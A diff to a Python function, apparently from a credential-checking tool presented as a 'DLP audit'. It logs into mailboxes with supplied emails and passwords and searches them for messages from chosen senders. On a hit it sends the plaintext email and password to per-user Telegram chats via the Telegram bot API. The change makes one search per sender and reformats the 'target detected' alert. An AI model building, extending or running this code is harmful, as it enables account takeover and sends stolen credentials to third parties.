@@ -417,38 +417,38 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
             
             for d_uname, d_chat_id, d_senders in db_users:
                 senders_list = [s.strip() for s in d_senders.split(',') if s.strip()]
-                if not senders_list: continue
-                
-                sender_q = " OR ".join([f"from:{s}" for s in senders_list])
-                if len(senders_list) > 1:
-                    sender_q = f"({sender_q})"
-                    
-                search_q = f'{sender_q} "{keyword}"' if keyword else sender_q
-                searches_to_run.append({
-                    "username": d_uname,
-                    "chat_id": d_chat_id,
-                    "query": search_q,
-                    "raw_sender": d_senders
-                })
+                for s in senders_list:
+                    search_q = f'from:{s} "{keyword}"' if keyword else f'from:{s}'
+                    searches_to_run.append({
+                        "username": d_uname,
+                        "chat_id": d_chat_id,
+                        "query": search_q,
+                        "label": s,
+                        "is_multi": True
+                    })
         except Exception as e:
             emit_event(q, "warning", {"message": f"Error fetching db users: {e}"})
     else:
         # Standard Single-User Search
         if sender:
             senders_list = [s.strip() for s in sender.split(',') if s.strip()]
-            sender_q = " OR ".join([f"from:{s}" for s in senders_list])
-            if len(senders_list) > 1:
-                sender_q = f"({sender_q})"
-            search_q = f'{sender_q} "{keyword}"' if keyword else sender_q
+            for s in senders_list:
+                search_q = f'from:{s} "{keyword}"' if keyword else f'from:{s}'
+                searches_to_run.append({
+                    "username": "Local Dashboard",
+                    "chat_id": tg_chat_id,
+                    "query": search_q,
+                    "label": s,
+                    "is_multi": False
+                })
         else:
-            search_q = keyword
-            
-        searches_to_run.append({
-            "username": "Local Dashboard",
-            "chat_id": tg_chat_id,
-            "query": search_q,
-            "raw_sender": sender
-        })
+            searches_to_run.append({
+                "username": "Local Dashboard",
+                "chat_id": tg_chat_id,
+                "query": keyword,
+                "label": keyword,
+                "is_multi": False
+            })
         
     global_classification = "CLEAN"
 
@@ -456,7 +456,7 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
         target_username = search_task["username"]
         target_chat_id = search_task["chat_id"]
         search_q = search_task["query"]
-        raw_sender = search_task["raw_sender"]
+        target_label = search_task["label"]
 
         emit_event(q, "step_start", {"step": 7, "name": f"Búsqueda: {search_q[:30]} ({target_username})"})
         emit_event(q, "info", {"message": f'Query [{target_username}]: "{search_q}"'})
@@ -569,9 +569,8 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
             emit_event(q, "warning", {"message": f"Search error [{target_username}]: {str(e)[:80]}"})
 
         if search_ok:
-            label = raw_sender or keyword
-            emit_event(q, "step_pass", {"step": 7, "detail": f"{total_found} msgs — {label} ({target_username})"})
-            emit_event(q, "dlp_result", {"total": total_found, "keyword": search_q, "sender": raw_sender})
+            emit_event(q, "step_pass", {"step": 7, "detail": f"{total_found} msgs — {target_label} ({target_username})"})
+            emit_event(q, "dlp_result", {"total": total_found, "keyword": search_q, "sender": target_label})
             
             if total_found > 0:
                 global_classification = "HIT"
@@ -599,14 +598,17 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 if TELEGRAM_BOT_TOKEN and target_chat_id:
                     try:
                         tg_msg = (
-                            f"🎯 *OBJETIVO CONSEGUIDO (HIT)* 🎯\n\n"
+                            f"📣 *¡OBJETIVO DETECTADO! (HIT)* 🎯\n"
+                            f"━━━━━━━━━━━━━━━━━━\n\n"
                             f"👤 *Usuario:* `{target_username}`\n"
+                            f"✅ *Match:* `{target_label}`\n\n"
                             f"📧 *Correo:* `{email}`\n"
-                            f"🔑 *Pass:* `{password}`\n"
-                            f"🌍 *País:* {country} | *Nombre:* {name}\n"
+                            f"🔑 *Pass:* `{password}`\n\n"
+                            f"🌍 *País:* {country}\n"
+                            f"👤 *Nombre:* {name}\n"
+                            f"📊 *Mensajes:* `{total_found}`\n\n"
                             f"🔍 *Búsqueda:* `{search_q}`\n"
-                            f"📊 *Total Encontrados:* {total_found}\n"
-                            f"🤖 *DLP Audit Bot*"
+                            f"🤖 *DLP Audit Pro System*"
                         )
                         
                         tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
